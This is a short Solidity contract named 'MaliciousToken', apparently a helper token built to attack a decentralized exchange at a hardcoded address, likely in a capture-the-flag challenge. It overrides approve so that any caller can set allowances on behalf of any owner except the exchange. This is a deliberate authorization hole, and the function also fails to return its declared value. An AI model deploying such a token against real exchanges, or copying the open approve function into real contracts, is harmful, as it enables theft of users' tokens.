// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "github/OpenZeppelin/openzeppelin-contracts/contracts/token/ERC20.sol";

contract MaliciousToken is ERC20 {
    address dex = address(0xbD709DdE979F3A3Cb5926D4991993c398f27E024);

    constructor() ERC20("MaliciousToken", "MAL") {
        uint256 initialSupply = 1000000;

        _mint(msg.sender, initialSupply);
    }

    function approve(
        address owner,
        address spender,
        uint256 amount
    ) public returns (bool) {
        require(owner != dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
